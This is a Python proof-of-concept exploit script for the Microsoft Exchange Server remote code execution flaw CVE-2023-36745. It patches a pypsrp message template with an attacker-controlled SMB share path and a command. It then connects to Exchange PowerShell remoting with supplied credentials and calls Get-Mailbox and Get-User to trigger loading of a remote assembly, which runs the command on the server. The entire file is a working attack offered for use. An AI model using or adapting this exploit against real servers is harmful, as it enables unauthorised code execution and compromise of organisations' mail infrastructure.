import argparse


def modifyPypsrp(assemblyLoadPath, command):
    msg = ""
    with open("pypsrp/messages.py.tpl") as f:
        msg = f.read()
    with open("pypsrp/messages.py", "w") as f:
        msg = msg.replace("$$assemblyLoadPath$$", assemblyLoadPath)
        msg = msg.replace("$$command$$", command)
        f.write(msg)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Microsoft Exchange Server CVE-2023-36745 RCE PoC\nExample: python3 exp.py -H exchange.webdxg.com -u webdxg.com\\dddai -p 4IDF7LAU -s \\\\192.168.237.131\\Shares\\ -c calc.exe"
    )
    parser.add_argument(
        "-H",
        dest="host",
        action="store",
        type=str,
        help="netbios, eg. exchange.webdxg.com",
        required=True,
    )
    parser.add_argument(
        "-u",
        dest="username",
        action="store",
        type=str,
        help="username, eg. webdxg.com\\dddai",
        required=True,
    )
    parser.add_argument(
        "-p",
        dest="password",
        action="store",
        type=str,
        help="password, eg. 4IDF7LAU",
        required=True,
    )
    parser.add_argument(
        "-s",
        dest="smb",
        action="store",
        type=str,
        help="smb, eg. \\\\192.168.237.131\\Shares\\",
        required=True,
    )
    parser.add_argument(
        "-c",
        dest="cmd",
        action="store",
        type=str,
        help="command, eg. calc.exe",
        required=True,
    )
    args = parser.parse_args()
    host = args.host
    username = args.username
    password = args.password
    smb = args.smb.replace("\\", "\\\\")
    cmd = args.cmd
    modifyPypsrp(smb, cmd)
    from pypsrp.powershell import PowerShell, RunspacePool
    from pypsrp.wsman import WSMan

    wsman = WSMan(
        server=host,
        username=username,
        password=password,
        path="powershell",
        ssl=False,
        port=80,
        auth="kerberos",
        scheme="http",
    )
    with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
        ps = PowerShell(pool)
        ps.add_cmdlet("Get-Mailbox").add_argument("")
        ps.invoke()
        errors = "\n".join([str(s) for s in ps.streams.error])
        # print(errors)
    wsman.close()
    wsman = WSMan(
        server=host,
        username=username,
        password=password,
        path="powershell",
        ssl=False,
        port=80,
        auth="kerberos",
        scheme="http",
    )
    with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
        ps = PowerShell(pool)
        ps.add_cmdlet("Get-User").add_argument("")
        ps.invoke()
        errors = "\n".join([str(s) for s in ps.streams.error])
        # print(errors)
        if (
            'Cannot convert the "Microsoft.Exchange.Data.MultiValuedProperty`1[FUSE.Paxos.Class1]"'
            in errors
        ):
            print("[+]All seems fine")
        else:
            print("[-]Check it manually")
    wsman.close()
